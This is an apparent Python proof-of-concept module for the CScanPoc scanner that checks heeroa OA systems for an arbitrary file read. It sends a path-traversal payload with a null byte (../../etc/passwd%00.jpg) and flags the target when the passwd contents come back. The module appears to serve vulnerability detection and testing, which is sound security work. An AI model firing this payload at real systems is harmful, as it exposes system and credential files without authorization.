# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'heeroa_0006' # 平台漏洞编号，留空
    name = 'heeroa OA系统通用型任意文件读取漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2014-07-24'  # 漏洞公布时间
    desc = '''
        heeroa OA系统通用型任意文件读取漏洞
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=058386' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'heeroa'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b84a79e7-ccb7-4b12-a66e-ad32425ecf42'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/bnuoa/info/infoShowAction.do?accessory=1&id=../../../../../../../../../../etc/passwd%00.jpg&method=getAccessory'
            url = arg + payload
            code, head, res, errcode, finalurl = hh.http(url)
            if 'root:x:0:' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()